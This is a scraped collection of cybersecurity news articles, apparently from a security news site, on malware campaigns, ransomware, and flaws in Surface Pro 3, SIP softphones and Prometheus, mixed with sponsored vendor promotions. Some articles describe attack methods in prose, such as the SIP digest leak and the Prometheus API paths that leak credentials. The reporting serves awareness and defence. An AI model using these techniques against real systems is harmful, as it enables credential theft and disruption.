campaign aimed at telecommunications, government, and information technology sectors in South Asia since June 2021 using a custom implant called “Graphon.“\n\n\nFound this article interesting?

{'title': 'Microsoft Warns of New Security Flaw Affecting Surface Pro 3 Devices',
'text': 'Microsoft has published a new advisory warning of a security bypass vulnerability affecting Surface Pro 3 convertible laptops that could be exploited by an adversary to introduce malicious devices within enterprise networks and defeat the device attestation mechanism.\nTracked as CVE-2021-42299 (CVSS score: 5.6), the issue has been codenamed “TPM Carte Blanche“ by Google software engineer Chris Fenner, who is credited with discovering and reporting the attack technique. As of writing, other Surface devices, including the Surface Pro 4 and Surface Book, have been deemed unaffected, although other non-Microsoft machines using a similar BIOS may be vulnerable.\n\n“Devices use Platform Configuration Registers (PCRs) to record information about device and software configuration to ensure that the boot process is secure,“ the Windows maker noted in a bulletin. “Windows uses these PCR measurements to determine device health. A vulnerable device can masquerade as a healthy device by extending arbitrary values into Platform Configuration Register (PCR) banks.“\nHowever, it’s worth noting that pulling off an attack necessitates physical access to a target victim’s device, or that a bad actor has had previously compromised a legitimate user’s credentials. Microsoft said it has “attempted“ to notify all affected vendors.\nIntroduced in Windows 10, Device Health Attestation (DHA) is an enterprise security feature that ensures client computers have trustworthy BIOS, Trusted Module Platform (TPM), and boot software configurations enabled such as early-launch antimalware (ELAM), Secure Boot, and much more. Put differently, DHA is designed to attest to the boot state of a Windows computer.\nThe DHA service achieves this by reviewing and validating the TPM and PCR boot logs for a device to issue what’s a tamper-resistant DHA report that describes how the device started. But by weaponizing this flaw, attackers can corrupt the TPM and PCR logs to acquire false attestations, effectively compromising the Device Health Attestation validation process.\n\n“On a Surface Pro 3 running recent platform firmware with SHA1 and SHA256 PCRs enabled, if the device is booted into Ubuntu 20.04 LTS, there are no measurements at all in the SHA256 bank low PCRs,“ Fenner said. “This is problematic because this allows arbitrary, false measurements to be made (from Linux userland, for example) corresponding to any Windows boot log desired. An honest SHA256 PCR quote over dishonest measurements can be requested using a legitimate [Attestation Key] in the attached TPM.“\nIn a real-world scenario, CVE-2021-42299 can be abused to fetch a false Microsoft DHA certificate by obtaining the TCG Log — which records measurements made during a boot sequence — from a target device whose health the attacker wants to impersonate, followed by send a valid health attestation request to the DHA service.\nAdditional technical details about the attack and a proof-of-concept (PoC) exploit can be accessed from Google’s Security Research repository here.\n\n\nFound this article interesting?

'text': 'Cybersecurity researchers on Tuesday took the wraps off a mass volume email attack staged by a prolific cybercriminal gang affecting a wide range of industries, with one of its region-specific operations notably targeting Germany and Austria.\nEnterprise security firm Proofpoint tied the malware campaign with high confidence to TA505, which is the name assigned to the financially motivated threat group that’s been active in the cybercrime business since at least 2014, and is behind the infamous Dridex banking trojan and an arsenal of other malicious tools such as FlawedAmmyy, FlawedGrace, Neutrino botnet, and Locky ransomware, among others.\nCybersecurity company Morphisec Labs is tracking the same attack chain under the independent moniker “MirrorBlast.“\nThe attacks are said to have started as a series of low-volume email waves, delivering only several thousand messages in each phase, before ramping up in late September and as recently as October 13, resulting in tens to hundreds of thousands of emails.\n\n“Many of the campaigns, especially the large volume ones, strongly resemble the historic TA505 activity from 2019 and 2020,“ the researchers said. “The commonalities include similar domain naming conventions, email lures, Excel file lures, and the delivery of the FlawedGrace remote access trojan (RAT).“\nThe group has a track record of striking research institutes, banks, retail businesses, energy companies, healthcare institutions, airlines, and government agencies for profit-seeking motives, with the malicious activities typically commencing upon opening malware-laced attachments in phishing messages purported to be related to COVID-19 updates, insurance claims, or notifications about Microsoft OneDrive shared files.\n\n“Over time, TA505 evolved from a lesser partner to a mature, self-subsisting and versatile crime operation with a broad spectrum of targets,“ NCC Group said in an analysis published in November 2020. “Throughout the years the group heavily relied on third party services and tooling to support its fraudulent activities, however, the group now mostly operates independently from initial infection until monetization.“\nThe success of the latest campaign, however, hinges on users enabling macros after opening the malicious Excel attachments, post which an obfuscated MSI file is downloaded to fetch next-stage loaders before the delivery of an updated version of the FlawedGrace RAT that incorporates support for encrypted strings and obfuscated API calls.\nFlawedGrace — first observed in November 2017 — is a fully-featured remote access trojan (RAT) written in C++ that’s deliberately designed to thwart reverse-engineering and analysis. It comes with a roster of capabilities that allow it to establish communications with a command-and-control server to receive instructions and exfiltrate the results of those commands back to the server.\n\nThe actor’s October attack wave is also significant for its shift in tactics, which include the use of retooled intermediate loaders scripted in unusual programming languages like Rebol and KiXtart in place of Get2, a downloader previously deployed by the group to perform reconnaissance, and download and install final-stage RAT payloads.\n“TA505 is an established threat actor that is financially motivated and known for conducting malicious email campaigns on a previously unprecedented scale,“ Proofpoint said. “The group regularly changes their TTPs and are considered trendsetters in the world of cybercrime. This threat actor does not limit its target set, and is, in fact, an equal opportunist with the geographies and verticals it chooses to attack.“\n“This combined with TA505’s ability to be flexible, focusing on what is the most lucrative and shifting its TTPs as necessary, make the actor a continued threat,“ the cybersecurity firm added.\n\n\nFound this article interesting?

In addition, the attackers are also believed to have deployed a custom keylogger as well as a PowerShell script in compromised environments to record keystrokes and plunder credentials stored in web browsers.\n\nThe Russian cybersecurity vendor said that the attack methods used in the campaign against Tunisian companies resembled techniques previously attributed to hacking operations associated with the DNSpionage group, which, in turn, has exhibited tradecraft overlaps to an Iranian threat actor dubbed OilRig (aka APT34), while calling out the “significant similarities“ between lure documents delivered by Lyceum in 2018-2019 and those used by DNSpionage.\n“With considerable revelations on the activity of DNSpionage in 2018, as well as further data points that shed light on an apparent relationship with APT34, […] the latter may have changed some of its modus operandi and organizational structure, manifesting into new operational entities, tools and campaigns,“ the researchers said. “One such entity is the Lyceum group, which after further exposure by Secureworks in 2019, had to retool yet another time.“\n\n\nFound this article interesting?

{'title': 'Why Database Patching Best Practice Just Doesn’t Work and How to Fix It',
'text': 'Patching really, really matters – patching is what keeps technology solutions from becoming like big blocks of Swiss cheese, with endless security vulnerabilities punching hole after hole into critical solutions.\nBut anyone who’s spent any amount of time maintaining systems will know that patching is often easier said than done.\nYes, in some instances, you can just run a command line to install that patch, and that’s it. These instances are increasingly rare though – given the complexity of the technology environment, you’re more likely faced with a complex process to achieve patching best practice.\nIn this article, we’ll outline why database patching matters (yes, databases are vulnerable too!), explain what the problem is with patching databases, and point to a novel solution that takes the pain out of database patching.\nWatch out – your database services are vulnerable too\nWe know that database services are critical – databases underpin IT operations in countless ways, working away in the background. Yet databases just aren’t the most interesting parts of the technology stack, which is one of the reasons database patching can get neglected. In a recent survey by Imperva, the company found that nearly 50% of on-premise databases were vulnerable to a known exploit.\nCybercriminals, however, are not ignoring databases. Just like any other element of the technology stack, databases are full of vulnerabilities. Just one database service alone has over a thousand related vulnerabilities.\nConsider a few examples. In September 2016, CVE-2016-6662 was reported, a vulnerability that allows attackers to inject malicious MySQL configuration settings into a victim’s database service. It affected MySQL clones too – including MariaDB, which was forced to publish detailed mitigating steps here.\nAnother example: in 2020, a database vulnerability was identified where attackers could mount a privilege escalation attack because of how certain versions of MariaDB handled “setuid“ at the installation stage.\nIn both our examples, patching – or upgrading to a newer version of the database service – would close the vulnerability. But herein lies the problem: patching doesn’t happen as consistently as it should, and not just because tech teams are lazy – or because database services are forgotten about.\nJust get on patch management, right…?\nNot quite. There’s a second reason why database patching gets neglected – patching a database can be incredibly hard, with conflicting and ambiguous instructions. This problem is particularly prevalent where database implementations are quite complex.\nTake MySQL clusters, for example. The open-source database MySQL has an official article outlining how users need to patch a MySQL cluster – but the instructions are intricate, and it only considers one particular setup of MySQL cluster, InnoDB, when there are other MySQL cluster strategies.\nThe above MySQL instructions also leave out a few important aspects of patching. It doesn’t cover how the patching process may affect other applications – or how it may affect other systems in your technology solution. It can’t offer this advice, of course, because every environment is different, and the writers don’t know what your environment looks like.\nAnd therein lies a major issue with patching best practice, and database best practice in general: it’s almost impossible to account for the infinite practical variations – from differences in database configuration to different levels of technical knowledge.\nPatching best practice just fit for purpose\nThe net result can be that implementing published patching best practice is a very ambiguous and uncertain exercise. Sysadmins can easily decide the risks and implications of patching going wrong is much more significant than the risk of a cyberattack on the database. So, while in theory, it’s easy to just “get on with patching“, the reality is very different.\nEven where teams have the technical knowledge and the practical certainty to make a success of database patching, there is still the reality that a database service must go offline for some time to perform the patching.\nWithout high availability, downtime is the most disruptive side effect as tech services go offline, disrupting work. \nHigh availability configurations can ensure that there’s no downtime, but even these are likely to experience service degradation as some servers in a cluster are offline and unable to support demand or provide adequate protection while some nodes are down for maintenance.\nComplex patching procedures also consume a significant amount of time which takes resources away from other important tasks – and in some cases, the resources might simply not be there to ensure consistent patching.\nFinally, taking databases offline for patching and managing complex migration processes always carries a risk of something going wrong. Data corruption could creep in during migration, or some servers may fail to come back to life after patching. These risks can’t be ignored – and are intrinsic to current database patching practices that require restarts.\nLive database patching as an alternative\nUntil recently patching a technology service almost always required a restart, but live patching is becoming increasingly prevalent. With live patching, the patching tools perform an in-place swap of the patched code: the service being patched keeps running while patching takes place, with no restart required.\nThat’s exactly the role of DatabaseCare, the new solution from TuxCare. Thanks to DatabaseCare, you can perform comprehensive patching as often as you like because DatabaseCare patches your database while it is actively running and serving data.\nHow does this work? It’s simple in practice. Your server connects to the on-premises DatabaseCare ePortal where patches are securely stored. As soon as a new vulnerability is logged, an agent communicates with the ePortal, which then pulls the update from DatabaseCare. The agent then momentarily freezes your database service in a safe mode, and transparently applies the patch in memory. This “freeze“ is so fast that it doesn’t even disrupt network connections to the database service or running queries.\nThe result: your databases are automatically updated with the latest security patches, without downtime, with minimal disruption and risk – and with zero ongoing effort from your technical teams.\nHow does DatabaseCare benefit you?\nLet’s take a clearer look at the benefits of live patching – compared to patching best practice as it stands.\nWe’ve already pointed to the complexity of database patching, particularly for high availability, distributed databases. DatabaseCare replaces a complex set of steps involving tricky migration procedures with a single, one-time, simple step – that’s easily automated too.\nIt removes the ambiguity from patching your databases. Are you following the right instructions? Will it work, even if you do it perfectly? All those questions are now gone – patching happens automatically and in the background. And so yes, the risk involved in patching databases is now significantly mitigated, which reduces the hesitation to patch.\nAt the same time, automated patching also means that you don’t need to try and fit patching in amongst another long list of draining IT tasks. And, when patching doesn’t compete for resources, it happens more regularly. Other business units inside the organization will appreciate how you no longer require long maintenance windows for your patching operations.\nWe all know what regular patching means: tighter security. Reduce the window between the release date of a patch, and when that patch is applied, and you reduce the window of opportunity for attackers to exploit a vulnerability.\nBest practice matters – but DatabaseCare unlocks consistent security\nPatching database services isn’t new – best practice instructions have been around for some time. But there are practical difficulties to patching best practices as it stands, and these practical difficulties leave a window for cyber attackers.\nDatabaseCare plugs the gap – it doesn’t disrupt your operations, it doesn’t pose a risk of failure, and you don’t need resources to make it work. In turn, your security becomes much more solid. Installing DatabaseCare is simple too. To find out more, just review the DatabaseCare page on the TuxCare website.\n\n\nFound this article interesting?

'text': 'Representatives from the U.S., the European Union, and 30 other countries pledged to mitigate the risk of ransomware and harden the financial system from exploitation with the goal of disrupting the ecosystem, calling it an “escalating global security threat with serious economic and security consequences.“ \n“From malign operations against local health providers that endanger patient care, to those directed at businesses that limit their ability to provide fuel, groceries, or other goods to the public, ransomware poses a significant risk to critical infrastructure, essential services, public safety, consumer protection and privacy, and economic prosperity,“ officials said in a statement released last week.\n\nTo that end, efforts are expected to be made to enhance network resilience by adopting cyber hygiene good practices, such as using strong passwords, securing accounts with multi-factor authentication, maintaining periodic offline data backups, keeping software up-to-date, and offering training to prevent clicking suspicious links or opening untrusted documents.\nBesides promoting incident information sharing between ransomware victims and relevant law enforcement and cyber emergency response teams (CERTs), the initiative aims to improve mechanisms put in place to effectively respond to such attacks, while also countering the abuse of financial infrastructure to launder ransom payments.\nThe joint bulletin was issued by Ministers and Representatives of Australia, Brazil, Bulgaria, Canada, Czech Republic, the Dominican Republic, Estonia, European Union, France, Germany, India, Ireland, Israel, Italy, Japan, Kenya, Lithuania, Mexico, the Netherlands, New Zealand, Nigeria, Poland, Republic of Korea, Romania, Singapore, South Africa, Sweden, Switzerland, Ukraine, the U.A.E, the U.K., and the U.S. Notably absent from the list were China and Russia.\n\nThe international counter-ransomware collaboration comes as illicit payments topped nearly $500 million globally in the last two years alone — $400 million in 2020 and $81 million in the first quarter of 2021 — necessitating the payment flows that make the activities profitable are subject to anti-money laundering regulations and the networks that facilitate these payments are held accountable.\nIn late September 2021, the U.S. Treasury Department imposed sanctions on Russian cryptocurrency exchange Suex for helping threat actors launder transactions from at least eight ransomware variants, marking the first instance of such an action against a virtual currency exchange. “Treasury will continue to disrupt and hold accountable these ransomware actors and their money laundering networks to reduce the incentive for cybercriminals to continue to conduct these attacks,“ the U.S. government said.\n\nThe development also comes following an independent report published by the department’s Financial Crimes Enforcement Network (FinCEN) on Friday, which potentially tied roughly $5.2 billion worth of outgoing Bitcoin transactions to 10 most commonly reported ransomware variants, in addition to identifying 177 unique wallet addresses used for ransomware-related payments based on an analysis of 2,184 suspicious activity reports (SARs) filed between January 1, 2011, and June 30, 2021.\nIn the first half of 2021 alone, ransomware-based financial activity is estimated to have extracted at least $590 million for the threat actors, with the mean average total monthly suspicious amount of ransomware transactions pegged at $66.4 million. The most commonly reported variants were REvil (aka Sodinokibi), Conti, DarkSide, Avaddon, and Phobos.\n“Financial institutions play an important role in protecting the U.S. financial system from ransomware- related threats through compliance with BSA obligations,“ the report noted. “Financial institutions should determine if a SAR filing is required or appropriate when dealing with a ransomware incident, including ransomware- related payments made by financial institutions that are victims of ransomware.“\n\n\nFound this article interesting?

'text': 'REvil, the notorious ransomware gang behind a string of cyberattacks in recent years, appears to have gone off the radar once again, a little over a month after the cybercrime group staged a surprise return following a two-month-long hiatus.\nThe development, first spotted by Recorded Future’s Dmitry Smilyanets, comes after a member affiliated with the REvil operation posted on the XSS hacking forum that unidentified actors had taken control of the gang’s Tor payment portal and data leak website.\n\n“The server was compromised and they were looking for me. To be precise, they deleted the path to my hidden service in the torrc file and raised their own so that I would (sic) go there. I checked on others - this was not. Good luck everyone, I’m off,“ user 0_neday said in the post.\nAs of writing, it isn’t clear exactly who was behind the compromise of REvil’s servers, although it wouldn’t be entirely surprising if law enforcement agencies played a role in bringing down the domains.\n\nThe Russia-linked ransomware group attracted major scrutiny following its attacks on JBS and Kaseya earlier this year, prompting it to take its darknet sites offline in July 2021. But on September 9, 2021, REvil made an unexpected return, resurfacing both its data leak site as well as payment and negotiation portals back online.\nLast month, the Washington Post reported that the U.S. Federal Bureau of Investigation (FBI) held back from sharing the decryptor with the victims of Kaseya ransomware attack for nearly three weeks, which it obtained from accessing the group’s servers, as part of a plan to disrupt the gang’s malicious activities. “The planned takedown never occurred because in mid-July REvil’s platform went offline — without U.S. government intervention — and the hackers disappeared before the FBI had a chance to execute its plan,“ the report added.\n\nA universal decryptor was eventually shared by Romanian cybersecurity firm Bitdefender in late July after acquiring the digital key from a “law enforcement partner.“\nWhile it’s not uncommon for ransomware groups to evolve, splinter, or reorganize under new names, the criminal field has increasingly come under the lens for striking critical infrastructure, even as more cybercriminals are recognizing the profitability of ransomware, in part bolstered by the unregulated cryptocurrency landscape, thus enabling threat actors to extort victims for digital payments with impunity.\n\n\nFound this article interesting?

{'title': 'Is Your Data Safe? Check Out Some Cybersecurity Master Classes',
'text': 'Since cybersecurity is definitely an issue that’s here to stay, I’ve just checked out the recently released first episodes of Cato Networks Cybersecurity Master Class Series. \nAccording to Cato, the series aims to teach and demonstrate cybersecurity tools and best practices; provide research and real-world case studies on cybersecurity; and bring the voices and opinions of top cybersecurity thought-leaders. Designed for security and IT professionals, C-level managers and security experts, each session contains both theory and hands-on examples about strategic, tactical, and operational issues on a wide range of topics. \nThe classes are hosted by industry-recognized cybersecurity researcher and keynote speaker, Etay Maor, who is also Senior Director of Security Strategy at Cato. Four out of the planned annual 8-10 episodes are currently available online. \nEpisode 1, entitled How (and Why) to Apply OSINT to Protect your Enterprise takes an in-depth look at our era of data proliferation and oversharing – people sharing too much information on social networks; PDF and Excel files with sensitive data out in the open; and devices exposing open ports and services. The public availability of all this information, which has grown with the increase of remote workforces since the start of COVID-19, makes Opensource Intelligence (OSINT) a real threat, as threat actors collect and identify data that can put businesses at risk. In addition to providing tips and tricks for a better understanding of OSINT, this master class discusses how to apply OSINT tools (including free tools) to protect users, processes, and technologies; and how Google Hacking, Shodan and Censys can be used to collect valuable data.As low-risk, high-reward ransomware attacks dominate the cyber threat landscape, the second episode Ransomware: Attackers, Defenders, and FBI’s Perspective is very relevant. Exploring the history of ransomware attacks and the types of extortions used, it also offers important information on how to operate security frameworks such as MITRE ATT&CK. And there are some fascinating FBI insights from guest speaker, SSA Doug Domin of the Boston FBI Criminal Cybersquad, as well as tips from ransomware groups themselves on how to avoid attacks!We’re probably all aware of the fact that deepfake technology is becoming more accessible, with attacks ranging from faking a video for ransom, to actual fraudulent transactions and national security incidents. In fact, the FBI recently released a warning that deepfake attacks against organizations are an imminent threat. Master class episode 3, entitled From Disinformation to Deepfake, provides an understanding of the different forms of information manipulation, such as voice synthesis, face swapping and puppet mastering. Guest presenter Raymond Lee, CEO of FakeNet.AI, provides some great examples and techniques on how to identify and mitigate deepfake threats, as he reviews different forms of information manipulation and levels of deepfake (from cheap fakes to full-on fusion), and types of attacks using deepfake technology. Finally, did you know that the White House recently released an executive order (EO) on improving US cybersecurity? Describing the various agencies and infrastructures deemed critical for nation security, the EO claims that “critical infrastructure“ doesn’t refer only to power plants, water facilities and military systems, but also to the many digital systems on which the nation relies. With cybersecurity incidents targeting critical infrastructures – from food manufacturers, to pipelines and government electronic healthcare systems – and supply chain attacks on the rise, the fourth episode, Supply Chain Attacks & Critical Infrastructure: CISA’s Approach to Resiliency offers an opportunity to understand whether we’re part of a critical system and what the government is doing to protect this. Ron Ford, Cyber Security Advisor at CISA/DHS (Cybersecurity and Infrastructure Security Agency/Department of Homeland Security), presents CISA’s mission and cybersecurity advisor program. Together with Etay Maor, they discuss critical infrastructure and supply chain attacks; scoping cybersecurity assessments – from strategic to technical; and the DHS “Misconceptions vs. Reality“ for securing infrastructures. \nSo, is your data safe? While I can’t answer that for you, I can definitely recommend these master classes, which offer refreshing and enriching discussions on how to deal with real-world security topics, as well as important insights and practical tips from industry leaders and very cool guest speakers. I’m already looking forward to the next episode, in which I understand they are going to be hosting the CISO of Delta Airlines. Enjoy!\n\n\nFound this article interesting?

'text': 'The operators behind the pernicious TrickBot malware have resurfaced with new tricks that aim to increase its foothold by expanding its distribution channels, ultimately leading to the deployment of ransomware such as Conti.\nThe threat actor, tracked under the monikers ITG23 and Wizard Spider, has been found to partner with other cybercrime gangs known Hive0105, Hive0106 (aka TA551 or Shathak), and Hive0107, adding to a growing number of campaigns that the attackers are banking on to deliver proprietary malware, according to a report by IBM X-Force.\n“These and other cybercrime vendors are infecting corporate networks with malware by hijacking email threads, using fake customer response forms and social engineering employees with a fake call center known as BazarCall,“ researchers Ole Villadsen and Charlotte Hammond said.\n\nSince emerging on the threat landscape in 2016, TrickBot has evolved from a banking trojan to a modular Windows-based crimeware solution, while also standing out for its resilience, demonstrating the ability to maintain and update its toolset and infrastructure despite multiple efforts by law enforcement and industry groups to take it down. Besides TrickBot, the Wizard Spider group has been credited with the development of BazarLoader and a backdoor called Anchor.\nWhile attacks mounted earlier this year relied on email campaigns delivering Excel documents and a call center ruse dubbed “BazaCall“ to deliver malware to corporate users, recent intrusions beginning around June 2021 have been marked by a partnership with two cybercrime affiliates to augment its distribution infrastructure by leveraging hijacked email threads and fraudulent website customer inquiry forms on organization websites to deploy Cobalt Strike payloads.\n“This move not only increased the volume of its delivery attempts but also diversified delivery methods with the goal of infecting more potential victims than ever,“ the researchers said.\n\nIn one infection chain observed by IBM in late August 2021, the Hive0107 affiliate is said to have adopted a new tactic that involves sending email messages to target companies informing that their websites have been performing distributed denial-of-service (DDoS) attacks on its servers, urging the recipients to click on a link for additional evidence. Once clicked, the link instead downloads a ZIP archive containing a malicious JavaScript (JS) downloader that, in turn, contacts a remote URL to fetch the BazarLoader malware to drop Cobalt Strike and TrickBot.\n“ITG23 has also adapted to the ransomware economy through the creation of the Conti ransomware-as-a-service (RaaS) and the use of its BazarLoader and Trickbot payloads to gain a foothold for ransomware attacks,“ the researchers concluded. “This latest development demonstrates the strength of its connections within the cybercriminal ecosystem and its ability to leverage these relationships to expand the number of organizations infected with its malware.“\n\n\nFound this article interesting?

'text': 'A new deceptive ad injection campaign has been found leveraging an ad blocker extension for Google Chrome and Opera web browsers to sneakily insert ads and affiliate codes on websites, according to new research from cybersecurity firm Imperva.\nThe findings come following the discovery of rogue domains distributing an ad injection script in late August 2021 that the researchers connected to an add-on called AllBlock. The extension has since been pulled from both the Chrome Web Store and Opera add-ons marketplaces.\n\nWhile AllBlock is designed to block ads legitimately, the JavaScript code is injected into every new tab opened on the browser. It works by identifying and sending all links in a web page — typically on search engine results pages — to a remote server, which responds back with a list of websites to replace the genuine links with, leading to a scenario where upon clicking a link, the victim is redirected to a different page.\n\n“When the user clicks on any modified links on the webpage, he will be redirected to an affiliate link,“ Imperva researchers Johann Sillam and Ron Masas said. “Via this affiliate fraud, the attacker earns money when specific actions like registration or sale of the product take place.“\nAllBlock is also characterized by a variety of techniques aimed at avoiding detection, including clearing the debug console every 100ms and excluding major search engines. Imperva said the AllBlock extension is likely part of a larger distribution campaign that may have utilized other browser extensions and delivery methods, with ties observed to a previous PBot campaign based on overlaps in domain names and IP addresses.\n\n“Ad injection is an evolving threat that can impact almost any site. Attackers will use anything from browser extensions to malware and adware installed on visitors’ devices, making most site owners ill-equipped to handle such attacks,“ Sillam and Masas said. \n“When ad injection is used, the site performance and user experience is degraded, making websites slower and harder to use,“ the researchers added. “Other impacts of ad injection include loss of customer trust and loyalty, revenue loss from ad placements, blocked content and diminished conversion rates.“\n\n\nFound this article interesting?

{'title': 'The Ultimate SaaS Security Posture Management (SSPM) Checklist',
'text': 'Cloud security is the umbrella that holds within it: IaaS, PaaS and SaaS. Gartner created the SaaS Security Posture Management (SSPM) category for solutions that continuously assess security risk and manage the SaaS applications’ security posture. With enterprises having 1,000 or more employees relying on dozens to hundreds of apps, the need for deep visibility and remediation for SaaS security settings is only getting more critical. \nThe top pain points for SaaS security stem from:\nLack of control over the growing SaaS app estateLack of governance in the lifecycle of SaaS apps: from purchase to deployment, operation and maintenanceLack of visibility of all the configurations in SaaS app estateSkills gap in ever-evolving, accelerating, complex cloud security Laborious and overwhelming workload to stay on top of hundreds to thousands (to tens of thousands) of settings and permissions.\nThe capability of governance across the whole SaaS estate is both nuanced and complicated. While the native security controls of SaaS apps are often robust, it falls on the responsibility of the organization to ensure that all configurations are properly set — from global settings, to every user role and privilege. It only takes one unknowing SaaS admin to change a setting or share the wrong report and confidential company data is exposed. The security team is burdened with knowing every app, user and configuration and ensuring they are all compliant with industry and company policy. \nEffective SSPM solutions come to answer these pains and provide full visibility into the company’s SaaS security posture, checking for compliance with industry standards and company policy. Some solutions even offer the ability to remediate right from within the solution. As a result, an SSPM tool can significantly improve security-team efficiency and protect company data by automating the remediation of misconfigurations throughout the increasingly complex SaaS estate.\nAs one might expect, not all SSPM solutions are created equal. Monitoring, alerts, and remediation should sit at the heart of your SSPM solution. They ensure that any vulnerabilities are quickly closed before they are exploited by cyberattacks. Solutions like the one developed by Adaptive Shield create a window into the SaaS environment. When comparing SSPM options, here are some key features to look out for (excerpted from the complete guide).\nVisibility & Insights\nRun comprehensive security checks to get a clear look into your SaaS environment, at all the integrations, and all the domains of risk.\nBreadth of integrations \nFirst and foremost for an SSPM solution, is the SSPM’s ability to integrate with all your SaaS apps. Each SaaS has its own framework and configurations, if there is access to users and the company’s systems, it should be monitored by the organization. Any app can pose a risk, even non-business-critical apps. Point of note is that often smaller apps can serve as a gateway for an attack. \nLook for an SSPM system with a minimum of 30 integrations that are adaptable and able to run checks on every data type to protect against misconfigurations.Even more, a solution should be able to support as many apps as possible that are within the SaaS IT stack, in a seamless “out-of-the box“ way. \nComprehensive & Deep Security Checks \nThe other vital component to an effective SSPM is the expanse and depth of the security checks. Each domain has its own facets for the security team to track and monitor. \nIdentity and access management Malware protectionData leakage protection Auditing Access control for external users Privacy control Compliance policies, security frameworks and benchmarks \nGet the complete guide along with the printable checklist here. \nContinuous Monitoring & Remediation\nCombat threats with continuous oversight and fast remediation of any misconfiguration\nRemediating issues in business environments is a complicated and delicate task. The SSPM solution should provide deep context about each and every configuration and enable you to easily monitor and set up alerts. This way vulnerabilities are quickly closed before they are exploited by cyberattacks. \nSSPM vendors like Adaptive Shield provide you with these tools, which allow your security team to communicate effectively, shut down vulnerabilities, and protect your system. \n24/7 continuous monitoring Activity Monitor AlertsTicketing RemediationPosture over time \nSystem Functionality\nIntegrate a strong and smooth SSPM system, without extra noise. \nYour SSPM solution should be easy to deploy and allow your security team to easily add and monitor new SaaS applications. Top security solutions should integrate easily with your applications and your existing cybersecurity infrastructure, to create a comprehensive defense against cyber threats. \nSelf-service wizards Robust APIsLow false positivesNon-intrusive Tiered use \nFinal Thoughts\nThe Right SSPM solution PREVENTS Your next attack \nSSPM is similar to brushing one’s teeth: it’s a foundational requirement needed to create a preventative state of protection. The right SSPM, like Adaptive Shield, provides organizations continuous, automated surveillance of all SaaS apps, alongside a built-in knowledge base to ensure the highest SaaS security hygiene. \nUsing Adaptive Shield, security teams will deploy best practices for SaaS security, while integrating with all types of SaaS applications—including video conferencing platforms, customer support tools, HR management systems, dashboards, workspaces, content, file-sharing applications, messaging applications, marketing platforms, and more.\nAdaptive Shield’s framework is easy to use, intuitive to master, and takes five minutes to deploy. \nLearn more about how you can secure your company’s SaaS security now. \n\n\nFound this article interesting?

{'title': 'Critical Remote Hacking Flaws Disclosed in Linphone and MicroSIP Softphones',
'text': 'Multiple security vulnerabilities have been disclosed in softphone software from Linphone and MicroSIP that could be exploited by an unauthenticated remote adversary to crash the client and even extract sensitive information like password hashes by simply making a malicious call.\nThe vulnerabilities, which were discovered by Moritz Abrell of German pen-testing firm SySS GmbH, have since been addressed by the respective manufacturers following responsible disclosure.\nSoftphones are essentially software-based phones that mimic desk phones and allow for making telephone calls over the Internet without the need for using dedicated hardware. At the core of the issues are the SIP services offered by the clients to connect two peers to facilitate telephony services in IP-based mobile networks.\n\nSIP aka Session Initiation Protocol is a signaling protocol that’s used to control interactive communication sessions, such as voice, video, chat and instant messaging, as well as games and virtual reality, between endpoints, in addition to defining rules that govern the establishment and termination of each session.\nA typical session in SIP commences with a user agent (aka endpoint) sending an INVITE message to a peer through SIP proxies — which are used to route requests — that, when accepted on the other end by the recipient, results in the call initiator being notified, followed by the actual data flow. SIP invitations carry session parameters that allow participants to agree on a set of compatible media types.\n\nThe attack devised by SySS is what’s called a SIP Digest Leak, which involves sending a SIP INVITE message to the target softphone to negotiate a session followed by sending a “407 proxy authentication required“ HTTP response status code, indicating the inability to complete the request because of a lack of valid authentication credentials, prompting the softphone to respond back with the necessary authentication data.\n\n“With this information, the attacker is able to perform an offline password guessing attack, and, if the guessing attack is successful, obtain the plaintext password of the targeted SIP account,“ Abrell explained. “Therefore, this vulnerability in combination with weak passwords is a significant security issue.“\n\nAlso discovered is a NULL pointer dereference vulnerability in the Linphone SIP stack that could be triggered by an unauthenticated remote attacker by sending a specially crafted SIP INVITE request that could crash the softphone. “A missing tag parameter in the From header causes a crash of the SIP stack of Linphone,“ Abrell said.\nThe disclosure is the second time a NULL pointer dereference vulnerability has been discovered in the Linphone SIP client. In September 2021, Claroty made public details of a zero-click flaw in the protocol stack (CVE-2021-33056) that could be remotely exploited without any action from a victim to crash the SIP client and cause a denial-of-service (DoS) condition.\n“The security level of SIP stacks still needs improvement,“ Abrell said, calling the need for a defense-in-depth approach that entails “defining and implementing appropriate security measures for the secure operation of unified communication systems.“\n\n\nFound this article interesting?

{'title': 'Experts Warn of Unprotected Prometheus Endpoints Exposing Sensitive Information',
'text': 'A large-scale unauthenticated scraping of publicly available and non-secured endpoints from older versions of Prometheus event monitoring and alerting solution could be leveraged to inadvertently leak sensitive information, according to the latest research.\n“Due to the fact that authentication and encryption support is relatively new, many organizations that use Prometheus haven’t yet enabled these features and thus many Prometheus endpoints are completely exposed to the Internet (e.g. endpoints that run earlier versions), leaking metric and label dat,“ JFrog researchers Andrey Polkovnychenko and Shachar Menashe said in a report.\nPrometheus is an open-source system monitoring and alerting toolkit used to collect and process metrics from different endpoints, alongside enabling easy observation of software metrics such as memory usage, network usage, and software-specific defined metrics, such as the number of failed logins to a web application. Support for Transport Layer Security (TLS) and basic authentication was introduced with version 2.24.0 released on January 6, 2021.\n\nThe findings come from a systematic sweep of publicly-exposed Prometheus endpoints, which were accessible on the Internet without requiring any authentication, with the metrics found exposing software versions and host names, which the researchers said could be weaponized by attackers to conduct reconnaissance of a target environment before exploiting a particular server or for post-exploitation techniques like lateral movement.\n\nSome of the endpoints and the information disclosed are as follows -\n/api/v1/status/config - Leakage of usernames and passwords provided in URL strings from the loaded YAML configuration file/api/v1/targets - Leakage of metadata labels, including environment variables as well as user and machine names, added to target machine addresses/api/v1/status/flags - Leakage of usernames when providing a full path to the YAML configuration file\n\nEven more concerningly, an attacker can use the “/api/v1/status/flags“ endpoint to query the status of two administration interfaces — “web.enable-admin-api“ and “web.enable-lifecycle“ — and if found manually enabled, exploit them to delete all saved metrics and worse, shut down the monitoring server. It’s worth noting the two endpoints are disabled by default for security reasons as of Prometheus 2.0.\n\nJFrog said it found about 15% of the Internet-facing Prometheus endpoints had the API management setting enabled, and 4% had database management turned on. A total of around 27,000 hosts have been identified via a search on IoT search engine Shodan.\nBesides recommending organizations to “query the endpoints […] to help verify if sensitive data may have been exposed,“ the researchers noted that “advanced users requiring stronger authentication or encryption than what’s provided by Prometheus, can also set up a separate network entity to handle the security layer.“\n\n\nFound this article interesting?

